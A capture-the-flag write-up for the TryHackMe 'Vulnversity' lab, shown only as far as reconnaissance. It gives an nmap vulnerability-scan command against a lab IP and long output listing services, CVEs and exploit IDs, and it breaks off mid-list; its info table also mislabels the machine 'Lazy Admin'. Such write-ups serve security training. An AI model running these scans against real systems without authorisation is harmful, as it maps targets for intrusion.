---
title: TryHackMe - Vulnversity                    # Add title of the machine here
date: 2022-03-31 08:00:00 -0600                           # Change the date to match completion date
categories: TryHackMe                    # Change Templates to Writeup
tags: [thm, writeup, fuzzing, file upload vulnerability, privesc]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
toc: true
image:
    path: /assets/images/thm/Vulnversity/Untitled.png
--- 



# Info

| Name         | Lazy Admin                                     |
| ------------ | ---------------------------------------------- |
| Room link    | [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)|
| Created by   | [tryhackme](https://tryhackme.com/p/tryhackme) |
| solving date | March 31th 2022                                |
| ---          |                                                |


## Reconnaissance

*   Let's start a quick Nmap scan to check the common ports

    <img src="/assets/images/thm/Vulnversity/Untitled 1.png" alt="Untitled" data-size="original">

    * Alright, there are 6 ports open
*   maybe there are other ports open, so let’s scan all the ports with -p- option

    * we can use -sV to detect the version of each service
    * \-sC to run nmap default scripts
    * —script vuln to scan vulnerability
    * \-sS → TCP SYN scan (Stealth scan)
    * \-oN to save a Normal format file

    ```
    ╰─# nmap -sV -sC --script vuln -p- -sS $target -oN Vulnversity_nmap                                                                                                                                 130 ↵
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-31 08:00 EET
    Nmap scan report for 10.10.143.49
    Host is up (0.079s latency).
    Not shown: 65529 closed ports
    PORT     STATE SERVICE     VERSION
    21/tcp   open  ftp         vsftpd 3.0.3
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    |_sslv2-drown: 
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    | vulners: 
    |   cpe:/a:openbsd:openssh:7.2p2: 
    |     	2C119FFA-ECE0-5E14-A4A4-354A2C38071A	10.0	https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A	*EXPLOIT*
    |     	PACKETSTORM:140070	7.8	https://vulners.com/packetstorm/PACKETSTORM:140070	*EXPLOIT*
    |     	EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	7.8	https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09	*EXPLOIT*
    |     	EDB-ID:40888	7.8	https://vulners.com/exploitdb/EDB-ID:40888	*EXPLOIT*
    |     	CVE-2016-8858	7.8	https://vulners.com/cve/CVE-2016-8858
    |     	CVE-2016-6515	7.8	https://vulners.com/cve/CVE-2016-6515
    |     	1337DAY-ID-26494	7.8	https://vulners.com/zdt/1337DAY-ID-26494	*EXPLOIT*
    |     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
    |     	CVE-2016-10009	7.5	https://vulners.com/cve/CVE-2016-10009
    |     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
    |     	SSV:92582	7.2	https://vulners.com/seebug/SSV:92582	*EXPLOIT*
    |     	CVE-2016-10012	7.2	https://vulners.com/cve/CVE-2016-10012
    |     	CVE-2015-8325	7.2	https://vulners.com/cve/CVE-2015-8325
    |     	SSV:92580	6.9	https://vulners.com/seebug/SSV:92580	*EXPLOIT*
    |     	CVE-2016-10010	6.9	https://vulners.com/cve/CVE-2016-10010
    |     	1337DAY-ID-26577	6.9	https://vulners.com/zdt/1337DAY-ID-26577	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-AIX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/	*EXPLOIT*
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/	*EXPLOIT*
    |     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
    |     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
    |     	EDB-ID:46516	5.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
    |     	EDB-ID:46193	5.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
    |     	CVE-2019-6111	5.8	https://vulners.com/cve/CVE-2019-6111
    |     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
    |     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
    |     	SSV:91041	5.5	https://vulners.com/seebug/SSV:91041	*EXPLOIT*
    |     	PACKETSTORM:140019	5.5	https://vulners.com/packetstorm/PACKETSTORM:140019	*EXPLOIT*
    |     	PACKETSTORM:136234	5.5	https://vulners.com/packetstorm/PACKETSTORM:136234	*EXPLOIT*
    |     	EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	5.5	https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F	*EXPLOIT*
    |     	EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	5.5	https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138	*EXPLOIT*
    |     	EXPLOITPACK:1902C998CBF9154396911926B4C3B330	5.5	https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330	*EXPLOIT*
    |     	EDB-ID:40858	5.5	https://vulners.com/exploitdb/EDB-ID:40858	*EXPLOIT*
    |     	EDB-ID:40119	5.5	https://vulners.com/exploitdb/EDB-ID:40119	*EXPLOIT*
    |     	EDB-ID:39569	5.5	https://vulners.com/exploitdb/EDB-ID:39569	*EXPLOIT*
    |     	CVE-2016-3115	5.5	https://vulners.com/cve/CVE-2016-3115
    |     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
    |     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
    |     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS	*EXPLOIT*
    |     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
    |     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
    |     	EDB-ID:45939	5.0	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
    |     	EDB-ID:45233	5.0	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
    |     	CVE-2018-15919	5.0	https://vulners.com/cve/CVE-2018-15919
    |     	CVE-2018-15473	5.0	https://vulners.com/cve/CVE-2018-15473
    |     	CVE-2017-15906	5.0	https://vulners.com/cve/CVE-2017-15906
    |     	CVE-2016-10708	5.0	https://vulners.com/cve/CVE-2016-10708
    |     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
    |     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
    |     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
    |     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
    |     	EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF	*EXPLOIT*
    |     	EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	4.3	https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF	*EXPLOIT*
    |     	EDB-ID:40136	4.3	https://vulners.com/exploitdb/EDB-ID:40136	*EXPLOIT*
    |     	EDB-ID:40113	4.3	https://vulners.com/exploitdb/EDB-ID:40113	*EXPLOIT*
    |     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
    |     	CVE-2016-6210	4.3	https://vulners.com/cve/CVE-2016-6210
    |     	1337DAY-ID-25440	4.3	https://vulners.com/zdt/1337DAY-ID-25440	*EXPLOIT*
    |     	1337DAY-ID-25438	4.3	https://vulners.com/zdt/1337DAY-ID-25438	*EXPLOIT*
    |     	CVE-2019-6110	4.0	https://vulners.com/cve/CVE-2019-6110
    |     	CVE-2019-6109	4.0	https://vulners.com/cve/CVE-2019-6109
    |     	CVE-2018-20685	2.6	https://vulners.com/cve/CVE-2018-20685
    |     	SSV:92581	2.1	https://vulners.com/seebug/SSV:92581	*EXPLOIT*
    |     	CVE-2016-10011	2.1	https://vulners.com/cve/CVE-2016-10011
    |     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
    |     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
    |     	PACKETSTORM:138006	0.0	https://vulners.com/packetstorm/PACKETSTORM:138006	*EXPLOIT*
    |     	PACKETSTORM:137942	0.0	https://vulners.com/packetstorm/PACKETSTORM:137942	*EXPLOIT*
    |     	MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS/	0.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS/	*EXPLOIT*
    |_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    3128/tcp open  http-proxy  Squid http proxy 3.5.12
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    |_http-server-header: squid/3.5.12
    | vulners: 
    |   cpe:/a:squid-cache:squid:3.5.12: 
    |     	MSF:ILITIES/UBUNTU-CVE-2019-12525/	7.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-12525/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2016-5408/	7.5	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2016-5408/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2020-11945/	7.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2020-11945/	*EXPLOIT*
    |     	CVE-2020-11945	7.5	https://vulners.com/cve/CVE-2020-11945
    |     	CVE-2019-12526	7.5	https://vulners.com/cve/CVE-2019-12526
    |     	CVE-2019-12525	7.5	https://vulners.com/cve/CVE-2019-12525
    |     	CVE-2019-12519	7.5	https://vulners.com/cve/CVE-2019-12519
    |     	CVE-2016-3947	7.5	https://vulners.com/cve/CVE-2016-3947
    |     	CVE-2020-24606	7.1	https://vulners.com/cve/CVE-2020-24606
    |     	MSF:ILITIES/UBUNTU-CVE-2016-4052/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-4052/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2016-4051/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-4051/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE_LINUX-CVE-2016-4052/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2016-4052/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-4052/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-4052/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-4051/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-4051/	*EXPLOIT*
    |     	MSF:ILITIES/GENTOO-LINUX-CVE-2016-4054/	6.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2016-4054/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2016-4051/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2016-4051/	*EXPLOIT*
    |     	CVE-2016-4054	6.8	https://vulners.com/cve/CVE-2016-4054
    |     	CVE-2016-4052	6.8	https://vulners.com/cve/CVE-2016-4052
    |     	CVE-2016-4051	6.8	https://vulners.com/cve/CVE-2016-4051
    |     	CVE-2020-15049	6.5	https://vulners.com/cve/CVE-2020-15049
    |     	CVE-2019-12523	6.4	https://vulners.com/cve/CVE-2019-12523
    |     	CVE-2019-18677	5.8	https://vulners.com/cve/CVE-2019-18677
    |     	MSF:ILITIES/UBUNTU-CVE-2021-31807/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2021-31807/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2016-3948/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2016-3948/	*EXPLOIT*
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2016-3948/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE_LINUX-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE_LINUX-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2016-3948/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2016-3948/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2016-10003/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2016-10003/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-3948/	*EXPLOIT*
    |     	MSF:ILITIES/GENTOO-LINUX-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/GENTOO-LINUX-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2016-3948/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2016-3948/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/AMAZON_LINUX-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2016-4556/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2016-4556/	*EXPLOIT*
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2016-3948/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2016-3948/	*EXPLOIT*
    |     	CVE-2021-28651	5.0	https://vulners.com/cve/CVE-2021-28651
    |     	CVE-2020-25097	5.0	https://vulners.com/cve/CVE-2020-25097
    |     	CVE-2020-14058	5.0	https://vulners.com/cve/CVE-2020-14058
    |     	CVE-2019-18679	5.0	https://vulners.com/cve/CVE-2019-18679
    |     	CVE-2019-18678	5.0	https://vulners.com/cve/CVE-2019-18678
    |     	CVE-2019-18676	5.0	https://vulners.com/cve/CVE-2019-18676
    |     	CVE-2018-1000024	5.0	https://vulners.com/cve/CVE-2018-1000024
    |     	CVE-2016-4556	5.0	https://vulners.com/cve/CVE-2016-4556
    |     	CVE-2016-4555	5.0	https://vulners.com/cve/CVE-2016-4555
    |     	CVE-2016-4554	5.0	https://vulners.com/cve/CVE-2016-4554
    |     	CVE-2016-4553	5.0	https://vulners.com/cve/CVE-2016-4553
    |     	CVE-2016-3948	5.0	https://vulners.com/cve/CVE-2016-3948
    |     	CVE-2016-10003	5.0	https://vulners.com/cve/CVE-2016-10003
    |     	CVE-2016-10002	5.0	https://vulners.com/cve/CVE-2016-10002
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-4053/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2016-4053/	*EXPLOIT*
    |     	MSF:ILITIES/GENTOO-LINUX-CVE-2016-4053/	4.3	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2016-4053/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2016-4053/	4.3	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2016-4053/	*EXPLOIT*
    |     	CVE-2019-12529	4.3	https://vulners.com/cve/CVE-2019-12529
    |     	CVE-2019-12521	4.3	https://vulners.com/cve/CVE-2019-12521
    |     	CVE-2016-4053	4.3	https://vulners.com/cve/CVE-2016-4053
    |     	CVE-2016-2390	4.3	https://vulners.com/cve/CVE-2016-2390
    |     	CVE-2021-31807	4.0	https://vulners.com/cve/CVE-2021-31807
    |     	CVE-2021-28652	4.0	https://vulners.com/cve/CVE-2021-28652
    |     	MSF:ILITIES/UBUNTU-CVE-2021-28651/	0.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2021-28651/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2021-28652/	0.0	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2021-28652/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2021-28651/	0.0	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2021-28651/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2021-31807/	0.0	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2021-31807/	*EXPLOIT*
    |_    	MSF:AUXILIARY/DOS/HTTP/SQUID_RANGE_DOS/	0.0	https://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/SQUID_RANGE_DOS/	*EXPLOIT*
    3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.143.49
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://10.10.143.49:3333/
    |     Form id: 
    |     Form action: #
    |     
    |     Path: http://10.10.143.49:3333/
    |     Form id: 
    |     Form action: #
    |     
    |     Path: http://10.10.143.49:3333/index.html
    |     Form id: 
    |     Form action: #
    |     
    |     Path: http://10.10.143.49:3333/index.html
    |     Form id: 
    |_    Form action: #
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum: 
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
    |   /internal/: Potentially interesting folder
    |_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
    | http-fileupload-exploiter: 
    |   
    |     Couldn't find a file-type field.
    |   
    |_    Couldn't find a file-type field.
    | http-internal-ip-disclosure: 
    |_  Internal IP Leaked: 127.0.1.1
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_      http://ha.ckers.org/slowloris/
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.18: 
    |     	E899CC4B-A3FD-5288-BB62-A4201F93FDCC	10.0	https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC	*EXPLOIT*
    |     	5DE1B404-0368-5986-856A-306EA0FE0C09	10.0	https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09	*EXPLOIT*
    |     	CVE-2022-23943	7.5	https://vulners.com/cve/CVE-2022-23943
    |     	CVE-2022-22720	7.5	https://vulners.com/cve/CVE-2022-22720
    |     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
    |     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
    |     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
    |     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
    |     	CVE-2017-7668	7.5	https://vulners.com/cve/CVE-2017-7668
    |     	CVE-2017-3169	7.5	https://vulners.com/cve/CVE-2017-3169
    |     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
    |     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
    |     	EDB-ID:46676	7.2	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
    |     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
    |     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
